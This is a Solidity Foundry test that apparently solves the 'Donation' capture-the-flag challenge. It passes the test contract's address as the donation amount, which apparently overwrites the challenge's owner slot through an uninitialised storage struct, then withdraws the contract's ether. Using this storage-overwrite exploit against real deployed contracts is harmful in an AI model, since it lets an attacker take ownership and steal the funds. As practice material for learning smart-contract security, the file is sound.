// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";

interface IDonationChallenge {
    function isComplete() external returns (bool);

    function donate(uint256 etherAmount) external payable;

    function withdraw() external;
}

interface IDonationChallengeFactory {
    function createChallenge() external payable returns (address);
}

contract DonationTest is Test {
    IDonationChallenge public challenge;

    function setUp() public {
        address factoryAddress = deployCode(
            "DonationChallengeFactory.sol:DonationChallengeFactory"
        );
        address challengeAddress = IDonationChallengeFactory(factoryAddress).createChallenge{
            value: 1 ether
        }();
        challenge = IDonationChallenge(challengeAddress);
    }

    function test() public {
        uint256 scale = 10 ** 18 * 1 ether;
        uint256 amount = uint256(address(this)) / scale;
        challenge.donate{ value: amount }(uint256(address(this)));
        challenge.withdraw();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
